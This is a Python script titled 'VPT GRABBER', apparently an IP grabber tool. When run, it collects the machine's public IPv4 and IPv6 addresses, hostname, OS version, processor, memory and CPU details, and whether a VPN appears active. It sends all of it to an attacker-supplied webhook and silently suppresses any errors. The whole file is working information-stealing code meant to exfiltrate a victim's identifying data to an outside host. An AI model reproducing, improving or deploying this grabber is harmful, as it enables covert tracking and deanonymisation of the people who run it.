import requests
import json
import platform
import psutil

# Fetch VPN IP ranges once and store them globally to avoid repeated requests
VPN_IPS = requests.get("https://raw.githubusercontent.com/Stoltdansker/IP-Grabber/main/vpnip.txt").text.splitlines()

# Function to check if the IP is from a known VPN provider
def is_vpn(ip):
    # Check if the IP starts with any of the known VPN IPs
    return any(ip.startswith(range.split('/')[0]) for range in VPN_IPS)

# Function to gather system information
def get_system_info():
    memory = psutil.virtual_memory()  # Get memory info
    return {
        "sys": platform.system(),
        "node": platform.node(),
        "ver": platform.version(),
        "mach": platform.machine(),
        "proc": platform.processor(),
        "arch": platform.architecture()[0],
        "memory": {
            "total": memory.total,
            "available": memory.available,
            "used": memory.used,
            "percent": memory.percent
        },
        "cpu_cores": psutil.cpu_count(logical=False),
        "logical_cpu_cores": psutil.cpu_count(logical=True),
        "cpu_freq": psutil.cpu_freq().current
    }

# Main function to gather IP and system information
def gather_info():
    try:
        ip = requests.get("https://api.ipify.org/").text
        ipv6 = requests.get("https://api64.ipify.org/").text
        sys_info = get_system_info()
        vpn_status = "Active" if is_vpn(ip) else "Not Active"

        return {
            "ip": ip,
            "ipv6": ipv6,
            "vpn_status": vpn_status,
            **sys_info
        }
    except requests.RequestException:
        return None

# Function to create and send the embed
def send_info(webhook, data):
    json_data = {
        "content": "",
        "embeds": [
            {
                "description": (
                    f"**IP Information**📲\nIP: {data['ip']}\nIPV6: {data['ipv6']}\n\n"
                    f"**System Information**🖥\nSystem: {data['sys']}\nHostname: {data['node']}\n"
                    f"Version: {data['ver']}\nMachine: {data['mach']}\nProcessor: {data['proc']}\n"
                    f"Architecture: {data['arch']}\n\n**Memory Information**🧠\n"
                    f"Total Memory: {data['memory']['total'] / (1024 ** 3):.2f} GB\n"
                    f"Available Memory: {data['memory']['available'] / (1024 ** 3):.2f} GB\n"
                    f"Used Memory: {data['memory']['used'] / (1024 ** 3):.2f} GB\n"
                    f"Memory Percentage Used: {data['memory']['percent']}%\n\n"
                    f"**CPU Information**❤️\nCPU Cores: {data['cpu_cores']} (Physical)\n"
                    f"Logical CPU Cores: {data['logical_cpu_cores']} (Logical)\n"
                    f"CPU Frequency: {data['cpu_freq']} MHz\n\n"
                    f"**VPN Status**🔒\nVPN: {data['vpn_status']}"
                ),
                "fields": [],
                "title": "VPT GRABBER"
            }
        ],
        "components": [],
        "actions": {}
    }
    
    try:
        response = requests.post(webhook, json=json_data)  # Use json parameter for automatic serialization
        response.raise_for_status()  # Raise an error for bad responses
    except requests.RequestException:
        pass  # Suppress any errors without printing

# Main execution
if __name__ == "__main__":
    webhook = "webhook-url-here"  # Replace with your actual webhook URL
    info = gather_info()
    if info:
        send_info(webhook, info)
